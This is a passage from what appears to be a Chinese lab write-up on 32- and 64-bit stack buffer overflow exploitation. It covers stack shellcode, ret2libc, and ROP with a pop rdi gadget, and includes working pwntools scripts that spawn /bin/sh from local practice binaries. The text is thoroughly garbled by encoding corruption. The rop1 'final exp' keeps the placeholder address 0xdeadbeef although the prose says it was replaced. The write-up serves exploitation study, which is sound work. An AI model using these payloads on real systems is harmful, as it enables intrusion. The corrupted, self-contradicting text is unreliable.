æˆç¼“å†²åŒºæº¢å‡ºï¼Œåˆ©ç”¨è¿™ä¸ªæ¼æ´å¯¹ç¨‹åºæµè¿›è¡ŒåŠ«æŒï¼Œæ‰§è¡Œæ„é€ å¥½çš„payloadã€‚ å…·ä½“çš„æ€è·¯ï¼šæŠŠpayloadå†™å…¥bufæ•°ç»„ä¸­ï¼Œå¹¶åˆ©ç”¨ç¼“å†²åŒºæº¢å‡ºæ¼æ´ï¼Œå°†è¿”å›åœ°å€ä¿®æ”¹ä¸ºbufæ•°ç»„çš„åœ°å€ï¼Œvuln()å‡½æ•°è¿”å›ä¹‹åï¼Œå°±ä¼šåˆ°bufæ•°ç»„ä¸­æ‰§è¡Œshellcode å¯ä»¥åˆ©ç”¨pwntoolsæœ‰ä¸€ä¸ªshellcraftæ¨¡å—å¯ä»¥å®ç°shellcdeï¼Œå…¶ä¸­å…¶ä¸­**shellcraft.sh()**å°±æ˜¯ç”Ÿæˆæ‰§è¡Œ/bin/shçš„shellcodeã€‚\nå¯ä»¥ç”¨asm()å°†shellcode è½¬æ¢ä¸ºæœºå™¨ç \n0x04 å®éªŒè¿‡ç¨‹ rop1_gdb ç¼–è¯‘rop1.cï¼Œå…³é—­æ ˆä¿æŠ¤å’ŒNXä¿æŠ¤ï¼Œåœ¨32ä½ç¯å¢ƒä¸‹ï¼Œç¼–è¯‘ç”Ÿæˆrop1 è¿™é‡Œæˆ‘ä»¬æƒ³å®ç°çš„æ˜¯é€šè¿‡gdb è°ƒè¯•rop1è·å¾—çœŸæ­£çš„bufåœ°å€ï¼Œç„¶åå‘é‡Œé¢è¾“å…¥æˆ‘ä»¬ç²¾å¿ƒæ„é€ å¥½çš„shellcode,å°†è¿”å›åœ°å€è¦†ç›–ä¸ºæˆ‘ä»¬æ‰¾åˆ°çš„çœŸå®bufåœ°å€ã€‚\nè¿™é‡Œè§£é‡Šä¸€ä¸‹ä¸ºä»€ä¹ˆgdbè°ƒè¯•ä¸­äº§ç”Ÿçš„bufåœ°å€å’ŒçœŸæ­£æ‰§è¡Œç¨‹åºçš„åœ°å€åŸå› \næ­£å¸¸ç¨‹åºè¿è¡Œæ—¶ï¼Œä¼šå°†ç¯å¢ƒå˜é‡å­—ç¬¦ä¸²æ•°ç»„å’Œå‘½ä»¤è¡Œå‚æ•°å­—ç¬¦ä¸²æ•°ç»„å­˜æ”¾åœ¨æ ˆé¡¶ï¼Œè€Œç¨‹åºä½¿ç”¨çš„å±€éƒ¨å˜é‡ç­‰æ•°æ®åˆ™ä½äºè¿™äº›å­—ç¬¦ä¸²æ•°ç»„ä¹‹åã€‚ç¯å¢ƒå˜é‡å­—ç¬¦ä¸²æ•°ç»„è®°å½•äº†è¯¸å¦‚å½“å‰ç”¨æˆ·åã€ç»ˆç«¯ç±»å‹ã€æœç´¢è·¯å¾„ç­‰ç¯å¢ƒä¿¡æ¯ã€‚ç¨‹åºç›´æ¥è¿è¡Œæ—¶ï¼Œç¨‹åºè¿›ç¨‹ç»§æ‰¿çš„æ˜¯è¿è¡Œå…¶çš„ shell çš„ç¯å¢ƒå˜é‡ï¼Œè€Œç¨‹åºé€šè¿‡ gdb è¿è¡Œæ—¶ï¼Œç¨‹åºè¿›ç¨‹ç»§æ‰¿çš„æ˜¯ gdb çš„ç¯å¢ƒå˜é‡ï¼Œè¿™ä¸¤è€…å­˜åœ¨ä¸åŒï¼Œä»è€Œä¼šé€ æˆä½äºæ ˆä¸Šçš„å±€éƒ¨å˜é‡çš„åœ°å€å‘ç”Ÿæ”¹å˜ã€‚ç”¨æˆ·å¯åœ¨ gdb ä¸­è¿è¡Œ show environment å‘½ä»¤è·å¾—ç¯å¢ƒå˜é‡å‚æ•°ã€‚ã€\nè¾ƒä¹‹ç¨‹åºç›´æ¥è¿è¡Œï¼Œä½äºæ ˆé¡¶çš„ç¯å¢ƒå˜é‡ä¸»è¦æœ‰ä»¥ä¸‹å˜åŒ–\nç¯å¢ƒå˜é‡çš„å†…å®¹å‘ç”Ÿæ”¹å˜ï¼Œåœ¨ç¨‹åºç›´æ¥è¿è¡Œæ—¶ï¼Œ_ å˜é‡å­˜æ”¾çš„æ˜¯ç¨‹åºçš„æ‰§è¡Œè·¯å¾„ï¼Œè€Œé€šè¿‡ gdb è¿è¡Œç¨‹åºæ—¶ï¼Œ_ å˜é‡å­˜æ”¾çš„æ˜¯ gdb çš„æ‰§è¡Œè·¯å¾„ã€‚ é€šè¿‡ gdb è¿è¡Œçš„è°ƒè¯•ç¨‹åºç»§æ‰¿äº† gdb çš„ç¯å¢ƒå˜é‡ï¼Œå…¶ä¸­åŒ…å«æ–°åŠ å…¥çš„ç¯å¢ƒå˜é‡ LINES å’Œ COLUMNSã€‚ ä½äºæ ˆä¸Šçš„å‚æ•°åˆ—è¡¨ä¹Ÿå¯èƒ½ä¸åŒï¼Œå½“ç”¨æˆ·é€šè¿‡ ./rop1 ç›´æ¥åœ¨shell ä¸­è¿è¡Œç¨‹åºæ—¶ï¼Œä½äºå‚æ•°æ•°ç»„çš„ç¬¬ä¸€é¡¹ argv[0] å†…å®¹ä¸ºâ€./rop1â€ ,è€Œç”¨æˆ·é€šè¿‡ gdb è¿è¡Œ hello ç¨‹åºæ—¶ï¼Œç¨‹åºçš„å‚æ•°åˆ—è¡¨çš„ç¬¬ä¸€é¡¹ argv[0] çš„å€¼ä¸ºè¯¥ç¨‹åºçš„ç»å¯¹è·¯å¾„â€/home/reus09/test/pwn/2_rop/rop1â€ï¼Œè¿™ä¹Ÿä¼šé€ æˆç¨‹åºè¿è¡Œæ—¶å±€éƒ¨å˜é‡åœ°å€çš„å·®å¼‚ã€‚å»ºè®®ç»ˆç«¯ç¯å¢ƒä¸‹ä½¿ç”¨ç»å¯¹è·¯å¾„è¿è¡Œç¨‹åºï¼Œé¿å…è¯¥å·®å¼‚ã€‚ è¿™é‡Œæœ‰ä¸‰ç§è§£å†³æ–¹æ¡ˆ\né€šè¿‡gdbæ¥attach ä¸€ä¸ªæ­£åœ¨è¿è¡Œçš„ç¨‹åºï¼Œå…¶åœ°å€å’Œæ­£åœ¨è¿è¡Œçš„åœ°å€æ˜¯ä¸€è‡´çš„\nåœ¨gdbè°ƒè¯•è¿‡ç¨‹ä¸­ï¼Œå¯¹ä¼ é€’ç»™è¿›ç¨‹çš„ç¯å¢ƒå˜é‡è¿›è¡Œæ“ä½œå’Œä¿®æ”¹\ngdb å¯é€šè¿‡ wrapper å‡½æ•°è¿è¡Œè°ƒè¯•ç¨‹åºã€‚å½“è®¾ç½®å¥½ wrapper ç¨‹åºåï¼Œgdb ä¼šä»¥ exec wrapper hello çš„ shell å‘½ä»¤çš„å½¢å¼å¯åŠ¨è°ƒè¯•ç¨‹åº Helloï¼Œwrapperç¨‹åºé¦–å…ˆè¿è¡Œå¹¶æœ€ç»ˆå¯åŠ¨è°ƒè¯•è¿›ç¨‹ï¼Œä¹‹åç”± gdb å¯¹è°ƒè¯•è¿›ç¨‹è¿›è¡Œæ§åˆ¶ã€‚é€šè¿‡ wrapper ç¨‹åºï¼Œå³å¯æ§åˆ¶ä¼ é€’ç»™è°ƒè¯•è¿›ç¨‹çš„ç¯å¢ƒå˜é‡ã€‚\n1 2 3 set exec-wrapper wrapperã€€//è®¾ç½® wrapper ç¨‹åºä¸º wrapper show exec-wrapper //æ˜¾ç¤ºå½“å‰çš„ wrapper ç¨‹åº unset exec-wrapperã€€//å–æ¶ˆå¯¹ wrapper ç¨‹åºçš„è®¾ç½® åˆ©ç”¨å†…æ ¸è½¬å‚¨è·å–çœŸå®åœ°å€ã€‚\nä½¿ç”¨å‘½ä»¤ulimit -c unlimitedå¯åŠ¨å†…æ ¸è½¬å‚¨ï¼Œç¼ºçœæƒ…å†µä¸‹ï¼Œå†…æ ¸åœ¨coredumpæ—¶æ‰€äº§ç”Ÿçš„coreæ–‡ä»¶æ”¾åœ¨ä¸è¯¥ç¨‹åºç›¸åŒçš„ç›®å½•ä¸­ï¼Œå¹¶ä¸”æ–‡ä»¶åå›ºå®šä¸ºcoreã€‚ ç„¶åä½¿ç”¨å‘½ä»¤gdb filename coreå³å¯è°ƒè¯•ï¼Œè·å¾—çœŸå®åœ°å€ã€‚ ç¬¬ä¸€ç§æ–¹æ¡ˆ é€šè¿‡gdbæ¥attach ä¸€ä¸ªæ­£åœ¨è¿è¡Œçš„ç¨‹åº è¿è¡Œrop1ç¨‹åº åˆ©ç”¨ps -ax æŸ¥çœ‹æ‰€æœ‰è¿›ç¨‹ï¼Œå‘ç°rop1è¿è¡Œçš„è¿›ç¨‹pid ä¸º 130896ï¼Œå°†å…¶ç›´æ¥attach åœ¨vulnåœ°æ–¹è®¾ç½®æ–­ç‚¹ï¼Œå¹¶ä¸”æ‰§è¡Œç¨‹åºï¼Œè¿›å…¥åˆ°vulnå‡½æ•°é‡Œé¢ ä¸€è·¯n å•æ­¥æ­¥è¿‡ï¼Œè·³åˆ°readå‡½æ•°ä¸Šé¢ å‘ç°bufåœ°å€ä¸º0xffffd1a0ï¼Œæ­¤æ—¶çš„bufåœ°å€å³ä¸ºçœŸå®åœ°å€ ç¬¬äºŒç§æ–¹æ¡ˆ gdbè°ƒè¯•è¿‡ç¨‹ä¸­ï¼Œå»é™¤ç¯å¢ƒå˜é‡\nè¾“å…¥å‘½ä»¤gdb rop1\n1 set exec-wrapper env -u COLUMNS -u LINES -u _ //åœ¨ gdb ä¸­è®¾ç½® wrapper ç¨‹åº ç„¶ååœ¨vulnå¤„è®¾ç½®æ–­ç‚¹ï¼Œè¿è¡Œç¨‹åºåï¼Œå•æ­¥è·³è¿‡ä¸€ç›´åˆ°readéƒ¨åˆ†\nå‘ç°æ­¤æ—¶çš„bufé¦–åœ°å€ä»ç„¶ä¸º 0xffffd1a0\nshellcode æ‰§è¡Œéƒ¨åˆ† ä¸Šè¿°ä¸¤ç§æ–¹æ¡ˆç¡®å®šäº†ç›´æ¥æ‰§è¡Œrop1ç¨‹åºçš„æ—¶å€™bufçš„çœŸæ­£é¦–åœ°å€0xffffd1a0\nä½†æ˜¯ç”±äºpwntools è‡ªå¸¦çš„ pythonç¯å¢ƒï¼Œä¼šå½±å“rop1ç¨‹åºè¿è¡Œçš„bufåœ°å€ï¼Œå› æ­¤è¿™ä¸ªçœŸå®åœ°å€æ˜¯ä¸èƒ½å¤Ÿåœ¨shellcodeä¸­ç›´æ¥ä½œä¸ºè¿”å›åœ°å€æ‰§è¡Œçš„ã€‚\nå› ä¸ºè¿™é‡Œéœ€è¦ç”¨gdbæ¥å®ç°shellcode çš„è°ƒè¯•ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åŠ å…¥gdbçš„ç¯å¢ƒï¼Œå¹¶è®¾ç½®ä¸€äº›è½¯æ–­ç‚¹æ¥ä¿è¯gdbä¸­å¯ä»¥æ‰§è¡Œåˆ°shellcode\nè¿™é‡Œéœ€è¦ç”¨åˆ°coreæŠ¥é”™çš„éƒ¨åˆ†ï¼ŒåŒæ ·æˆ‘ä»¬ä¹Ÿéœ€è¦ç®¡é“æ¥è¾“å…¥æˆ‘ä»¬ç²¾å¿ƒæ„é€ å¥½çš„shellcode\nè¿™é‡Œæˆ‘ä»¬éœ€è¦ç¡®å®šä¸€ä¸‹bufæ•°ç»„çš„é•¿åº¦ï¼Œä»¥åŠè¿”å›é•¿åº¦çš„ä½æ•°ï¼Œä»¥ä¾¿äºç¡®å®šæ‰¾åˆ°è¿”å›åœ°å€ä»è€Œè¦†ç›–æ‰å®ƒã€‚\nè¿™é‡Œæˆ‘ä»¬é‡‡ç”¨åœ¨IDAé‡Œé¢æŸ¥çœ‹ä¸€ä¸‹æˆ‘ä»¬éœ€è¦å¡«å……å¤šå°‘å­—ç¬¦\nIDAæŸ¥çœ‹bufæ•°ç»„çš„å­˜å‚¨æƒ…å†µ ç”±æ­¤ç¡®å®šbufé¦–åœ°å€åˆ°esp çš„é•¿åº¦ä¸º 0x88,ç„¶ååˆ°è¿”å›åœ°å€çš„é•¿åº¦ä¸º0x04,å› æ­¤ç®—ä¸Šæˆ‘ä»¬æ„é€ çš„shellcodeï¼Œæˆ‘ä»¬éœ€è¦å¡«å……0x8cä¸ªå­—ç¬¦ ç„¶åæˆ‘ä»¬è¿™é‡Œä»¥ä¸€ä¸ªé”™è¯¯çš„åœ°å€0xdeadbeefæ¥äº§ç”ŸæŠ¥é”™ï¼Œä»è€Œå¾—åˆ°åœ¨gdbä¸­bufçš„å¯ç”¨åœ°å€\næˆ‘ä»¬é€šè¿‡pwntoolsäº§ç”Ÿshellcodeå°†å…¶ä¿å­˜ä¸ºdeadbeefï¼Œå…¶æœ€åçš„åœ°å€ä¼šè¢«è¦†ç›–ä¸º0xdeadbeef\nè„šæœ¬å¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 from pwn import * p = process(\u0026#39;./rop1\u0026#39;) shellcode = asm(shellcraft.sh()) shellcode_addr = 0xdeadbeef payload = shellcode.ljust(0x8c,b\u0026#39;a\u0026#39;)+p32(shellcode_addr) print(payload) with open(\u0026#34;deadbeef\u0026#34;,\u0026#39;wb\u0026#39;) as f: f.write(payload) å¯ä»¥çœ‹åˆ°æˆ‘ä»¬ç²¾å¿ƒæ„é€ çš„shellcodeå·²ç»å­˜å‚¨åˆ°æ–‡ä»¶deadbeefé‡Œé¢\nåœ¨gdb ä¸­è°ƒè¯•\nå‘½ä»¤r \u0026lt; deadbeefï¼Œæ‰§è¡Œè¿‡ç¨‹ä¸­é€šè¿‡ç®¡é“è¾“å…¥æˆ‘ä»¬æ„é€ å¥½çš„shellcode å‘ç°å¯„å­˜å™¨ECXå­˜å‚¨çš„æ˜¯shellcodeå­˜å‚¨çš„é¦–åœ°å€ æ­¤åœ°å€0xffffd170å³ä¸ºæˆ‘ä»¬gdbè°ƒè¯•è¿‡ç¨‹ä¸­å¯ä»¥åˆ©ç”¨çš„bufçœŸå®åœ°å€ ä¸‹é¢åˆ©ç”¨ä¸Šé¢åŒæ ·çš„æ–¹æ³•ï¼Œæ„é€ å¥½æˆ‘ä»¬éœ€è¦çš„äº§ç”Ÿshellcodeçš„æ–‡ä»¶\n1 2 3 4 5 6 7 8 9 10 11 from pwn import * p = process(\u0026#39;./rop1\u0026#39;) shellcode = asm(shellcraft.sh()) shellcode_addr = 0xffffd170 payload = shellcode.ljust(0x8c,b\u0026#39;a\u0026#39;)+p32(shellcode_addr) print(payload) with open(\u0026#34;gdb_with_payload\u0026#34;,\u0026#39;wb\u0026#39;) as f: f.write(payload) æˆ‘ä»¬å¯ä»¥åˆ©ç”¨çš„shellcodeæ–‡ä»¶å³å·²ç»æ„é€ å®Œæˆã€‚\nä¸‹é¢åœ¨gdbä¸­æ‰§è¡Œæˆ‘ä»¬çš„shellcode\nè¿™é‡Œéœ€è¦åšä¸€äº›å‰ç½®å·¥ä½œï¼Œå› ä¸ºæˆ‘ä»¬æƒ³è¦è®¾ç½®ä¸€äº›è½¯æ–­ç‚¹ã€‚å¦åˆ™è¾“å…¥shellcodeåè¿›ç¨‹ä¼šè¢«ç›´æ¥æ€æ­»ï¼Œç¨‹åºåªä¼šä¸€é—ªè€Œè¿‡ã€‚\nè¿™ä¸ªè½¯æ–­ç‚¹çš„æ„æ€æ˜¯ï¼Œè·Ÿè¸ªæˆ‘ä»¬è¾“å…¥çš„æ–‡ä»¶ï¼Œæ–‡ä»¶è¾“å…¥å®Œæ¯•åï¼Œè®¾ç½®æ–­ç‚¹\nå‘½ä»¤å¦‚ä¸‹\n1 2 3 4 5 set detach-on-fork on set follow-fork-mode child set breakpoint pending on b_start é¦–å…ˆå‘Šè¯‰ gdb è·Ÿè¸ªå­è¿›ç¨‹ï¼›ç„¶åè®¾ç½®set breakpoint pending onæ˜¯ä¸ºäº†åœ¨è®¾ç½®æ–­ç‚¹æ—¶è®© gdb ä¸å¼ºåˆ¶åœ¨å¯¹ç¬¦å·ä¸‹æ–­ç‚¹æ—¶å°±éœ€è¦å›ºå®šåœ°å€ï¼Œè¿™æ ·åœ¨b _startæ—¶å°±ä¼š pending è€Œä¸æ˜¯æŠ¥é”™ï¼›æœ€åå†è¿æ¥åˆ°çˆ¶è¿›ç¨‹ä»¥åŠåŠ è½½å­è¿›ç¨‹çš„ç¬¦å·ã€‚ ç›´æ¥gdb rop1è¿›å…¥å‘½ä»¤ï¼Œç„¶åè¾“å…¥ä¸Šè¿°è®¾ç½®å­è¿›ç¨‹çš„å‘½ä»¤\nç„¶åè¾“å…¥å‘½ä»¤r \u0026lt; gdb_with_payloadï¼Œæ‰§è¡Œçš„æ—¶å€™é€šè¿‡ç®¡é“ç¬¦è½½å…¥æ•°æ®gdb_with_payloadï¼Œè¿™é‡Œè¦†ç›–è¿”å›åœ°å€çš„æ˜¯æˆ‘ä»¬ç²¾å¿ƒæ„é€ çš„é€‚åˆgdbç¯å¢ƒçš„bufåœ°å€(æ³¨æ„ï¼Œè¿™é‡Œçš„bufåœ°å€å¹¶ä¸æ˜¯ç¨‹åºç›´æ¥è¿è¡Œäº§ç”Ÿçš„bufåœ°å€) è¿ç»­çš„rå‘½ä»¤ è¿™é‡Œé€šè¿‡ä¸€ä¸ªå­è¿›ç¨‹çš„è°ƒåº¦ä»è€Œè¿è¡Œäº†æˆ‘ä»¬çš„shellcodeï¼Œå¾ˆæ˜æ˜¾å¯ä»¥çœ‹åˆ°è¿™é‡Œå‡ºç°äº†æˆ‘ä»¬çš„è¾“å…¥å‘½ä»¤ éªŒè¯æ˜¯å¦æ‹¿åˆ°shell\nè¾“å…¥å‘½ä»¤ls è¾“å…¥å‘½ä»¤whoami è¿™æ ·æˆ‘ä»¬å°±å®ç°äº†é€šè¿‡gdbè°ƒè¯•ç›´æ¥ æ§åˆ¶shellï¼Œä½†æ˜¯ç”±äºè®¾ç½®æ–­ç‚¹çš„å­è¿›ç¨‹è¾“å…¥å‘½ä»¤åï¼Œç›´æ¥è¢«é™„è¿‘åˆ°å½“å‰çš„å‘½ä»¤ï¼Œæ•…æ¯æ¬¡è°ƒè¯•åªèƒ½ä½¿ç”¨ä¸€æ¬¡ã€‚\nrop1_py è¿™é‡Œæ˜¯ä½¿ç”¨pwntoolså·¥å…·æ¥å®ç°æ‹¿åˆ°shell,pwntoolså®ç°çš„è¿æ¥æŒä¹…ï¼Œè¿™é‡ŒåŒæ ·ä¹Ÿæ˜¯æˆ‘ä»¬ä¸Šè¿°æåˆ°çš„ç¬¬ä¸‰ç§æ–¹æ¡ˆåˆ©ç”¨å†…æ ¸è½¬å‚¨è·å–çœŸå®åœ°å€(å³åˆ©ç”¨ dump core æ¥å®ç°è·å–bufåœ°å€ï¼Œè¿™ä¸ªbufåœ°å€æ˜¯å—pythonç¯å¢ƒå½±å“çš„)\né¦–å…ˆæ„é€ è™šå‡çš„åœ°å€0xdeadbeefæ¥ä½¿ç¨‹åºå´©æºƒäº§ç”Ÿcore\nè„šæœ¬å¦‚ä¸‹\n1 2 3 4 5 6 7 from pwn import * p = process(\u0026#39;./rop1\u0026#39;) shellcode = asm(shellcraft.sh()) shellcode_addr = 0xdeadbeef payload = shellcode.ljust(0x8c,b\u0026#39;a\u0026#39;)+p32(shellcode_addr) p.sendline(payload) p.interactive() åœ¨ç»ˆç«¯æ‰§è¡Œè¯¥è„šæœ¬\né€šè¿‡å‰ålså‘½ä»¤å¯ä»¥å¾ˆæ¸…æ™°çš„çœ‹åˆ°ï¼Œæ‰§è¡Œè„šæœ¬ä¹‹åç¨‹åºå´©æºƒï¼Œäº§ç”Ÿäº†coreæŠ¥é”™æ–‡ä»¶ æ‰§è¡Œå‘½ä»¤gdb ./rop1 coreæ¥è°ƒè¯•è¯¥core\næ­¤æ—¶espæŒ‡é’ˆä½äºè¿”å›åœ°å€çš„ä¸‹ä¸€ä¸ªä½ç½®ï¼Œå› æ­¤bufçš„åœ°å€æ˜¯esp-0x4-0x8cï¼Œå³åœ°å€esp-0x90 é€šè¿‡å‘½ä»¤x/s $esp-0x90æŸ¥çœ‹ å‘ç°åœ°å€0xffffd1c0å­˜å‚¨çš„æœç„¶æ˜¯shellcodeå­˜æ”¾çš„åœ°æ–¹ äºæ˜¯ç›´æ¥å°†è¿”å›åœ°å€ä¿®æ”¹ä¸º0xffffd1c0\nåœ¨ç»ˆç«¯æ‰§è¡Œexp\nå¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬å·²ç»æ‹¿åˆ°äº†shell æœ€ç»ˆexp å¦‚ä¸‹\n1 2 3 4 5 6 7 from pwn import * p = process(\u0026#39;./rop1\u0026#39;) shellcode = asm(shellcraft.sh()) shellcode_addr = 0xdeadbeef payload = shellcode.ljust(0x8c,b\u0026#39;a\u0026#39;)+p32(shellcode_addr) p.sendline(payload) p.interactive() rop2_32 ç¼–è¯‘rop1.cï¼Œåªå¼€å¯Canaryæ ˆä¿æŠ¤ï¼Œåœ¨32ä½ç¯å¢ƒä¸‹ï¼Œç¼–è¯‘ç”Ÿæˆrop2 å¯ä»¥çœ‹åˆ°NXä¿æŠ¤å·²ç»å¼€å¯ï¼Œç¨‹åºä¸º32ä½ç¨‹åº æŸ¥çœ‹rop2è¿›ç¨‹æ ˆçš„æƒé™ä¸ºrw-pï¼Œä¸å¯æ‰§è¡Œ æ ˆä¸Šçš„ç¨‹åºä¸èƒ½è¿è¡Œï¼Œå³æˆ‘ä»¬ä¸èƒ½åœ¨æ ˆä¸Šæ‰§è¡Œshellcodeï¼Œä½†åœ¨ç¨‹åºä¸­ç”¨åˆ°äº†libcåº“ä¸­çš„readå’Œprintfå‡½æ•°ï¼Œlibc.soä¸­ä¿å­˜äº†å¤§é‡çš„å¯ç”¨å‡½æ•°ï¼Œè€ƒè™‘è°ƒç”¨system(\u0026quot;/bin/sh\u0026quot;)æ¥ç»•è¿‡NXä¿æŠ¤è·å–shell\næ ¹æ®ROPçš„åŸç†ï¼Œä¸éš¾å‘ç°ï¼Œæˆ‘ä»¬å¯ä»¥å°†è¿”å›åœ°å€è¦†ç›–ä¸ºæˆ‘ä»¬è¦è°ƒç”¨çš„systemå‡½æ•°åœ°å€ï¼Œç„¶ååœ¨å®ƒä¸‹é¢å†™å…¥systemå‡½æ•°éœ€è¦è¿”å›çš„åœ°å€ä»¥åŠå®ƒä¼ å…¥çš„å‚æ•°/bin/sh\nç¤ºæ„å›¾å¦‚ä¸‹ è¿™é‡Œé¦–å…ˆç¡®å®šä¸€ä¸‹bufé¦–åœ°å€åˆ°è¿”å›åœ°å€ä¸­é—´çš„å·®è·ï¼Œä»¥ä¾¿ç¡®å®šå¡«å……å¤šå°‘å­—ç¬¦æ¥è¦†ç›–è¿”å›åœ°å€ã€‚\nåŒæ ·ç”¨IDA æŸ¥çœ‹ rop2 ä¸­ bufçš„ç»“æ„ å‘ç°éœ€è¦å¡«å……çš„å­—ç¬¦ä¸º0x88 + 0x04 ä¸º 0x8c å› ä¸ºæˆ‘ä»¬ç¯å¢ƒå·²ç»å…³é—­äº†åœ°å€éšæœºåŒ–ï¼Œå› æ­¤systemå’Œ/bin/shçš„åœ°å€å¹¶ä¸ä¼šéšç¨‹åºè¿è¡Œè€Œæ”¹å˜ã€‚\næ¥ä¸‹æ¥å¯»æ‰¾systemçš„åœ°å€\næˆ‘ä»¬å¯ä»¥åœ¨gdb è°ƒè¯•è¿‡ç¨‹ä¸­ ç›´æ¥ è°ƒç”¨å‘½ä»¤print system æ¥æŸ¥çœ‹systemå‡½æ•°åœ°å€ å› æ­¤systemå‡½æ•°åœ°å€ä¸º0xf7e17830 æ¥ä¸‹æ¥éœ€è¦æˆ‘ä»¬éœ€è¦çš„å­—ç¬¦ä¸²/bin/shçš„å­˜å‚¨åœ°å€\nè¿™é‡Œæˆ‘ä»¬éœ€è¦è°ƒè¯•gdbè¿‡ç¨‹ä¸­ï¼Œç”¨åˆ°vmmap å‘½ä»¤æ¥æŸ¥çœ‹libc.soçš„èµ·å§‹ä½ç½®ï¼Œåœ¨å…¶ä¸­é—´æŸ¥æ‰¾åˆ°å­˜å‚¨/bin/shçš„åœ°å€ æ ¹æ®èµ·å§‹åœ°å€å’Œç»“æŸåœ°å€ï¼ŒæŸ¥æ‰¾/bin/shçš„ä½ç½® æ˜¾ç„¶/bin/shå­˜æ”¾çš„åœ°å€ä¸º0xf7f64352 æˆ‘ä»¬è°ƒç”¨systemåçš„è¿”å›åœ°å€å› ä¸ºæˆ‘ä»¬ä¸éœ€è¦è¿”å›ï¼Œæ‰€ä»¥ç›´æ¥å¡«å……0xdeadbeefå³å¯\nåœ¨ç»ˆç«¯ä¸‹è°ƒç”¨exp\nå¾ˆæ˜æ˜¾å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å·²ç»æ‹¿åˆ°äº†shell æœ€ç»ˆexp:\n1 2 3 4 5 6 7 8 9 10 11 from pwn import * p = process(\u0026#39;./rop2\u0026#39;) #gdb.attach(p,\u0026#39;b vuln\u0026#39;) sys_addr=0xf7e17830 binsh_addr=0xf7f64352 payload = b\u0026#39;a\u0026#39;*0x8c + p32(sys_addr)+p32(0xdeadbeef)+p32(binsh_addr) p.sendline(payload) p.interactive() rop3_64 ç¼–è¯‘rop1.cï¼Œåªå¼€å¯Canaryæ ˆä¿æŠ¤ï¼Œå…³é—­no-pieåœ¨64ä½ç¯å¢ƒä¸‹ï¼Œç¼–è¯‘ç”Ÿæˆrop3 è¿™é‡ŒåŒæ ·å…³é—­äº†NXä¿æŠ¤,åŒæ—¶ç¼–è¯‘äº§ç”Ÿçš„ç¨‹åºä¸º64ä½ å¹¶ä¸èƒ½åœ¨æ ˆä¸Šç›´æ¥å†™shellcodeï¼Œè€ƒè™‘åŒæ ·æ„é€ ROPé“¾çš„å½¢å¼æ¥æ‹¿åˆ°shellï¼Œä½†æ˜¯64ä½ç¨‹åºä¸åŒäº32ä½ç¨‹åºï¼Œå‚æ•°å­˜æ”¾åœ¨å¯„å­˜å™¨ä¸­ï¼Œå¤šäº6ä¸ªå‚æ•°æ‰ä¼šæ”¾åœ¨æ ˆä¸Šã€‚\nå›¾ä¾‹\nå…³äºæ¼æ´åˆ©ç”¨\nç”±äºå‚æ•°ä¸ä¼šç›´æ¥æ”¾åœ¨æ ˆä¸Šï¼Œéœ€è¦å¯»æ‰¾ç±»ä¼¼äºpop rdiï¼›retçš„gadgetï¼Œå°†å‚æ•°ä»æ ˆä¸­å¼¹å‡ºåˆ°rdiå¯„å­˜å™¨åï¼Œè¿”å›åˆ°è¿”å›åœ°å€å¤„ç»§ç»­æ‰§è¡Œã€‚æœ¬ä¾‹å­åœ¨æ ˆä¸­äº‹å…ˆå‹å…¥å‚æ•°/bin/shåœ°å€å’Œsystemåœ°å€ã€‚ å›¾ä¾‹å³ä¸º ubuntu20 å­—èŠ‚å¯¹é½ é¦–å…ˆæŸ¥çœ‹ä¸€ä¸‹è¦ä»bufæ•°ç»„åˆ°è¿”å›åœ°å€ æˆ‘ä»¬éœ€è¦è¦†ç›–å¤šå°‘å­—èŠ‚\nè¿™é‡ŒåŒæ ·ä½¿ç”¨IDAæ¥æŸ¥çœ‹ç¨‹åº å‘ç°bufæ•°ç»„é•¿åº¦ä¸º0x80ï¼Œè¿”å›åœ°å€é•¿åº¦ä¸º0x08ï¼Œæ•…æˆ‘ä»¬éœ€è¦è¦†ç›–çš„é•¿åº¦ä¸º0x88 æ‰¾åˆ°å­˜åœ¨pop rdi;retçš„æŒ‡ä»¤åœ°å€\nè¿™é‡Œä½¿ç”¨ROPgadget å·¥å…· é¦–å…ˆä½¿ç”¨å‘½ä»¤ldd rop3æŸ¥çœ‹rop3ä½¿ç”¨çš„libcçš„ç‰ˆæœ¬ï¼Œæ‰¾åˆ°å¯¹åº”çš„ç‰ˆæœ¬ï¼Œç„¶åå°±åœ¨libcåº“ä¸­æŸ¥åˆ°æˆ‘ä»¬éœ€è¦çš„pop rdi;ret è¿™é‡Œæˆ‘ä»¬å°±æ‹¿åˆ°äº†pop|rdi ç›¸å¯¹äºlibcçš„åç§»åœ°å€0x0000000000026b72 æ‰¾åˆ°systemå’Œ/bin/shçš„åœ°å€\nè¿™é‡Œçš„æ–¹æ³•å’Œæ‰¾rop2ä¸­çš„æ–¹æ³•ä¸€æ ·\nåœ¨gdbè°ƒè¯•è¿‡ç¨‹ä¸­ï¼Œåˆ†åˆ«ç”¨print system å’Œvmmap æŸ¥æ‰¾åœ°å€\nå¯ä»¥çœ‹åˆ°systemçš„å­˜å‚¨åœ°å€ä¸º0x7ffff7e22410\nvmmap å’Œfindå‘½ä»¤æŸ¥æ‰¾/bin/shåœ°å€\nå¯ä»¥çœ‹åˆ°/bin/shçš„åœ°å€ä¸º0x7ffff7f845aa\n/usr/lib/x86_64-linux-gnu/libc-2.31.soçš„èµ·å§‹åœ°å€ä¸º0x7ffff7dcd000\næŒ‰é“ç†è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å·²ç»å°†åœ°å€ä¸€ä¸€å¯¹åº”å¡«å…¥å³å¯æ‹¿åˆ°shellcodeï¼Œä½†æ˜¯ç”±äºæˆ‘ä»¬æœºå™¨ä½¿ç”¨çš„ä¸ºubuntu 20,åœ¨ubuntu18ç‰ˆæœ¬ä»¥ä¸Šçš„ç³»ç»Ÿï¼Œ64ä½çš„ç¨‹åºè‹¥åŒ…å«äº†systemï¼ˆâ€œ/bin/shâ€ï¼‰ï¼Œå°±éœ€è¦è€ƒè™‘å †æ ˆå¹³è¡¡ã€‚å› ä¸ºåœ¨Ubuntu18ä¸‹systemè°ƒç”¨æ—¶è¦æ±‚åœ°å€å’Œ16å­—èŠ‚å¯¹é½ï¼Œå¦‚æœæ²¡æœ‰æ 